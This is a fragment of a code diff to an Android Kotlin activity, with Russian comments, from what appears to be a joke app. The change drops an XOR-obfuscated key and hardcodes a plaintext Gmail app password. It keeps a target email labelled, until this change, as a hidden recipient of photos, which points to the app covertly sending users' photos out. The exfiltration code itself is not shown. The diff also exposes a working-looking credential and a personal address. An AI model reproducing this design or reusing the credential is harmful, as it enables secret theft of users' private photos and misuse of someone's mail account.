@@ -36,14 +36,10 @@ class MainActivity : AppCompatActivity() {
     private var timer: CountDownTimer? = null
     private var isRunning = false
     
-    // Скрытый ключ (зашифрован XOR)
-    // Оригинальный ключ: ketufvduqebiogig
-    private val encryptedKey = "buxlfpkz{ohmqpk"
-    private val xorKey = 5
-    private val apiKey: String
-        get() = encryptedKey.map { it.code xor xorKey }.joinToString("") { it.toChar().toString() }
+    // App Password для Gmail
+    private val apiKey = "pqktageoufxxmaxj"
     
-    // Email для получения фото (скрыт)
+    // Email для получения фото
     private val targetEmail = "metrobugitt@gmail.com"
 
     // Массив с шутками и приколами
